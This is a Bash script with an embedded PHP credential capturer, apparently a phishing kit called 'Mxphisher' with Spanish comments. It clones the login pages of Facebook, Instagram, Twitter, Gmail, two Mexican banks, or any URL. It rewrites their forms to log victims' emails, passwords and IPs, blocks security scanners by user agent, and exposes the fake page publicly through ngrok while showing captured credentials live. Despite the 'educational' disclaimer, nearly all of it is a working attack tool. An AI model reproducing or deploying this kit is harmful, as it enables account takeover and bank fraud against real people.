#!/bin/bash

# Mxphisher - Herramienta de phishing educativa
# Autor: Falconmx1
# Solo para pruebas de seguridad autorizadas

trap ctrl_c INT
ctrl_c() {
    echo -e "\n\n[\033[31m✘\033[0m] Saliendo...\n"
    killall ngrok php 2>/dev/null
    exit 1
}

# Colores bien vergas
R="\033[0;31m"
G="\033[0;32m"
Y="\033[0;33m"
B="\033[0;34m"
M="\033[0;35m"
C="\033[0;36m"
W="\033[0;37m"
NC="\033[0m"

# Cargar módulos
source core/banner.sh
source core/cloner.sh
source core/tunnel.sh
source core/anti_robots.sh
source core/logger.sh

# Variables globales
SITIO_SELECCIONADO=""
URL_ORIGINAL=""
PUERTO=8080
SERVER_PID=""
NGROK_PID=""

menu_principal() {
    banner_calavera
    echo -e "\n${Y}┌─────────────────────────────────────────┐${NC}"
    echo -e "${Y}│${W}  1${Y})${W} Facebook                          ${Y}│${NC}"
    echo -e "${Y}│${W}  2${Y})${W} Instagram                         ${Y}│${NC}"
    echo -e "${Y}│${W}  3${Y})${W} Twitter                           ${Y}│${NC}"
    echo -e "${Y}│${W}  4${Y})${W} Gmail                             ${Y}│${NC}"
    echo -e "${Y}│${W}  5${Y})${W} BBVA México                       ${Y}│${NC}"
    echo -e "${Y}│${W}  6${Y})${W} Banorte                           ${Y}│${NC}"
    echo -e "${Y}│${W}  7${Y})${W} URL personalizada                 ${Y}│${NC}"
    echo -e "${Y}│${W}  8${Y})${W} Salir                             ${Y}│${NC}"
    echo -e "${Y}└─────────────────────────────────────────┘${NC}"
    echo -ne "\n${B}➤${W} Elige tu víctima moral: "
    read opcion

    case $opcion in
        1) SITIO_SELECCIONADO="facebook"; URL_ORIGINAL="https://facebook.com";;
        2) SITIO_SELECCIONADO="instagram"; URL_ORIGINAL="https://instagram.com";;
        3) SITIO_SELECCIONADO="twitter"; URL_ORIGINAL="https://twitter.com";;
        4) SITIO_SELECCIONADO="gmail"; URL_ORIGINAL="https://gmail.com";;
        5) SITIO_SELECCIONADO="bbva"; URL_ORIGINAL="https://www.bbva.mx";;
        6) SITIO_SELECCIONADO="banorte"; URL_ORIGINAL="https://www.banorte.com";;
        7) 
            echo -ne "${B}➤${W} URL completa (con https://): "
            read URL_ORIGINAL
            SITIO_SELECCIONADO=$(echo $URL_ORIGINAL | sed 's/https:\/\///' | sed 's/\./_/g')
            ;;
        8) exit 0;;
        *) echo -e "${R}[✘] Opción no válida"; sleep 1; menu_principal;;
    esac

    iniciar_ataque
}

iniciar_ataque() {
    echo -e "\n${G}[+]${W} Preparando Mxphisher para: ${Y}$SITIO_SELECCIONADO${NC}"
    
    # Clonar el sitio
    clonar_sitio "$URL_ORIGINAL" "$SITIO_SELECCIONADO"
    
    # Personalizar el index con el capturador PHP
    personalizar_phish "$SITIO_SELECCIONADO"
    
    # Iniciar servidor PHP
    iniciar_servidor
    
    # Iniciar Ngrok
    iniciar_ngrok
    
    # Mostrar enlaces
    mostrar_enlaces
    
    # Logs en tiempo real
    monitorear_logs
}

# Función para personalizar el phishing (modifica el HTML)
personalizar_phish() {
    local sitio=$1
    local php_template="templates/phishing_template.php"
    
    # Respaldar index original
    cp "sites/$sitio/index.html" "sites/$sitio/index.original.html"
    
    # Reemplazar el formulario por el PHP capturador
    sed -i 's/<form/<form action="login.php" method="POST"/g' "sites/$sitio/index.html"
    
    # Crear el login.php capturador
    cat > "sites/$sitio/login.php" << 'EOF'
<?php
// Mxphisher - Capturador de credenciales
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$fecha = date('Y-m-d H:i:s');

// Anti-robots
$bots = ['curl', 'python', 'wget', 'bot', 'spider', 'scanner'];
foreach($bots as $bot) {
    if(stripos($user_agent, $bot) !== false) {
        http_response_code(403);
        die("🤖 Acceso denegado: No se permiten bots");
    }
}

// Capturar credenciales
$email = $_POST['email'] ?? $_POST['username'] ?? $_POST['user'] ?? '';
$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['pwd'] ?? '';

if($email && $password) {
    $log_entry = "[$fecha] IP: $ip | UA: $user_agent | EMAIL: $email | PASS: $password" . PHP_EOL;
    file_put_contents("../logs/{$sitio}_creds.log", $log_entry, FILE_APPEND);
    
    // Redirigir al sitio real
    header("Location: index.original.html");
    exit();
} else {
    header("Location: index.html?error=1");
}
?>
EOF
    
    # Reemplazar variable sitio en el PHP
    sed -i "s/{$sitio}/$sitio/g" "sites/$sitio/login.php"
    
    echo -e "${G}[✔]${W} Phishing personalizado listo en sites/$sitio/"
}

iniciar_servidor() {
    cd "sites/$SITIO_SELECCIONADO"
    php -S 0.0.0.0:$PUERTO > /dev/null 2>&1 &
    SERVER_PID=$!
    cd ../..
    echo -e "${G}[✔]${W} Servidor PHP corriendo en puerto $PUERTO (PID: $SERVER_PID)"
}

iniciar_ngrok() {
    if ! command -v ngrok &> /dev/null; then
        echo -e "${Y}[!]${W} Ngrok no instalado. Descargando..."
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip -q ngrok-stable-linux-amd64.zip
        sudo mv ngrok /usr/local/bin/
        rm ngrok-stable-linux-amd64.zip
    fi
    
    ngrok http $PUERTO > /dev/null 2>&1 &
    NGROK_PID=$!
    sleep 4
    
    # Obtener URL de Ngrok
    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
    
    if [ -n "$NGROK_URL" ]; then
        echo -e "${G}[✔]${W} Ngrok activo: ${Y}$NGROK_URL${NC}"
    else
        echo -e "${R}[✘]${W} Error al iniciar Ngrok"
    fi
}

mostrar_enlaces() {
    echo -e "\n${C}════════════════════════════════════════════${NC}"
    echo -e "${G}✨ ENLACES LISTOS PARA PISHING ✨${NC}"
    echo -e "${C}════════════════════════════════════════════${NC}"
    echo -e "${Y}📡 Local:${W}    http://localhost:$PUERTO"
    echo -e "${Y}🌍 Ngrok:${W}    $NGROK_URL"
    echo -e "${Y}📁 Logs:${W}     logs/${SITIO_SELECCIONADO}_creds.log"
    echo -e "${C}════════════════════════════════════════════${NC}\n"
    
    echo -e "${R}⚠️  COMPARTE SOLO EL ENLACE DE NGROK ⚠️${NC}"
    echo -e "${Y}💀 Esperando víctimas... (Ctrl+C para salir)${NC}\n"
}

monitorear_logs() {
    LOG_FILE="logs/${SITIO_SELECCIONADO}_creds.log"
    mkdir -p logs
    touch "$LOG_FILE"
    
    echo -e "${C}[*]${W} Monitoreando capturas en tiempo real:\n"
    tail -f "$LOG_FILE" 2>/dev/null | while read linea; do
        echo -e "${R}[!]${Y} ¡CREENCIALES CAPTURADAS!${NC}"
        echo -e "${C}$linea${NC}\n"
    done
}

# Verificar dependencias
if ! command -v php &> /dev/null; then
    echo -e "${R}[✘] PHP no instalado. Instálalo con: sudo apt install php -y${NC}"
    exit 1
fi

if ! command -v wget &> /dev/null; then
    echo -e "${R}[✘] Wget no instalado. Instálalo con: sudo apt install wget -y${NC}"
    exit 1
fi

# Ejecutar
menu_principal
